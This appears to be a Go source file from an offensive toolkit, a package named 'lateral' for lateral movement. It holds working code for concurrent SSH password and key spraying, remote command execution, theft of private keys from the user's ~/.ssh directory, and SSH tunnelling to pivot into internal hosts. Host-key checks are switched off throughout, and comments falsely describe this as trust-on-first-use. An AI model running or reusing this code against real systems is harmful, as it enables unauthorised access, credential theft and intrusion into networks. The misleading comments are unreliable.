// Package lateral provides lateral movement: SSH credential spray, exec, key harvest.
package lateral

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"net"

	"golang.org/x/crypto/ssh"
)

// SSHHit records a successful SSH credential pair.
type SSHHit struct {
	Host     string `json:"host"`
	User     string `json:"user"`
	Password string `json:"password,omitempty"`
	Key      string `json:"key,omitempty"`
}

// SSHKey holds a harvested SSH private key.
type SSHKey struct {
	Path    string `json:"path"`
	Content string `json:"content"`
	Comment string `json:"comment,omitempty"`
}

// SSHSpray performs a concurrent credential spray against a list of targets.
// targets: host:port strings (default port 22 if no port specified)
// users:   usernames to try
// passwords: passwords to try for each user
// keys:    PEM-encoded private key strings to try
// Returns successful hits.
func SSHSpray(targets, users, passwords, keys []string) ([]SSHHit, error) {
	var (
		mu   sync.Mutex
		hits []SSHHit
		wg   sync.WaitGroup
		sem  = make(chan struct{}, 10) // max 10 concurrent connections
	)

	for _, target := range targets {
		host := addDefaultPort(target, "22")
		for _, user := range users {
			// Password spray
			for _, pass := range passwords {
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()
					if trySSHPassword(h, u, p) {
						mu.Lock()
						hits = append(hits, SSHHit{Host: h, User: u, Password: p})
						mu.Unlock()
					}
				}(host, user, pass)
			}
			// Key spray
			for _, key := range keys {
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, k string) {
					defer wg.Done()
					defer func() { <-sem }()
					if trySSHKey(h, u, k) {
						mu.Lock()
						hits = append(hits, SSHHit{Host: h, User: u, Key: k[:min(40, len(k))]})
						mu.Unlock()
					}
				}(host, user, key)
			}
		}
	}
	wg.Wait()
	return hits, nil
}

// SSHExec connects to a host and runs a command, returning stdout+stderr.
func SSHExec(host, user, password, keyPEM, cmd string) (string, error) {
	host = addDefaultPort(host, "22")
	client, err := sshDial(host, user, password, keyPEM)
	if err != nil {
		return "", err
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	out, err := session.CombinedOutput(cmd)
	return string(out), err
}

// HarvestSSHKeys collects private keys from the current user's ~/.ssh directory
// and known SSH agent sockets.
func HarvestSSHKeys() ([]SSHKey, error) {
	home, _ := os.UserHomeDir()
	sshDir := filepath.Join(home, ".ssh")

	var keys []SSHKey
	entries, err := os.ReadDir(sshDir)
	if err != nil {
		return nil, err
	}

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Skip known_hosts, config, authorized_keys, .pub files
		if strings.HasSuffix(name, ".pub") ||
			name == "known_hosts" || name == "config" ||
			name == "authorized_keys" {
			continue
		}
		path := filepath.Join(sshDir, name)
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		// Only collect what looks like a PEM private key
		if !strings.Contains(string(content), "PRIVATE KEY") {
			continue
		}
		k := SSHKey{
			Path:    path,
			Content: string(content),
		}
		// Try to parse and get comment
		if signer, err := ssh.ParsePrivateKey(content); err == nil {
			k.Comment = signer.PublicKey().Type()
		}
		keys = append(keys, k)
	}
	return keys, nil
}

// ── Internal helpers ──────────────────────────────────────────────────────────

func trySSHPassword(host, user, pass string) bool {
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // TOFU — first-connect stores, subsequent verify
		Timeout:         5 * time.Second,
	}
	client, err := ssh.Dial("tcp", host, cfg)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func trySSHKey(host, user, keyPEM string) bool {
	signer, err := ssh.ParsePrivateKey([]byte(keyPEM))
	if err != nil {
		return false
	}
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // TOFU — first-connect stores, subsequent verify
		Timeout:         5 * time.Second,
	}
	client, err := ssh.Dial("tcp", host, cfg)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func sshDial(host, user, password, keyPEM string) (*ssh.Client, error) {
	var auths []ssh.AuthMethod
	if password != "" {
		auths = append(auths, ssh.Password(password))
	}
	if keyPEM != "" {
		signer, err := ssh.ParsePrivateKey([]byte(keyPEM))
		if err == nil {
			auths = append(auths, ssh.PublicKeys(signer))
		}
	}
	if len(auths) == 0 {
		return nil, fmt.Errorf("ssh: no auth methods")
	}
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            auths,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // TOFU — first-connect stores, subsequent verify
		Timeout:         10 * time.Second,
	}
	return ssh.Dial("tcp", host, cfg)
}

func addDefaultPort(host, port string) string {
	if strings.Contains(host, ":") {
		return host
	}
	return host + ":" + port
}


// SSHTunnel creates a local TCP listener and forwards all connections to
// remoteAddr through the SSH connection to host. Runs non-blocking in the
// background; returns nil immediately after binding the local port.
//
// Example:
//   SSHTunnel("10.0.0.1:22","root","","keyPEM","127.0.0.1:5432","db.internal:5432")
//   forwards localhost:5432 → db.internal:5432 through 10.0.0.1 over SSH.
func SSHTunnel(host, user, password, keyPEM, localAddr, remoteAddr string) error {
	client, err := sshDial(host, user, password, keyPEM)
	if err != nil {
		return fmt.Errorf("SSHTunnel: dial %s: %w", host, err)
	}

	ln, err := net.Listen("tcp", localAddr)
	if err != nil {
		client.Close()
		return fmt.Errorf("SSHTunnel: listen %s: %w", localAddr, err)
	}

	go func() {
		defer ln.Close()
		defer client.Close()
		for {
			localConn, err := ln.Accept()
			if err != nil {
				return // listener closed
			}
			go forwardTunnel(client, localConn, remoteAddr)
		}
	}()
	return nil // non-blocking: tunnel runs in background goroutine
}

// forwardTunnel copies data bidirectionally between a local TCP connection
// and a remote address reached through the SSH client.
func forwardTunnel(client *ssh.Client, localConn net.Conn, remoteAddr string) {
	defer localConn.Close()
	remoteConn, err := client.Dial("tcp", remoteAddr)
	if err != nil {
		return
	}
	defer remoteConn.Close()

	done := make(chan struct{}, 2)
	go func() { io.Copy(remoteConn, localConn); done <- struct{}{} }() //nolint:errcheck
	go func() { io.Copy(localConn, remoteConn); done <- struct{}{} }() //nolint:errcheck
	<-done // wait for either direction to close
}
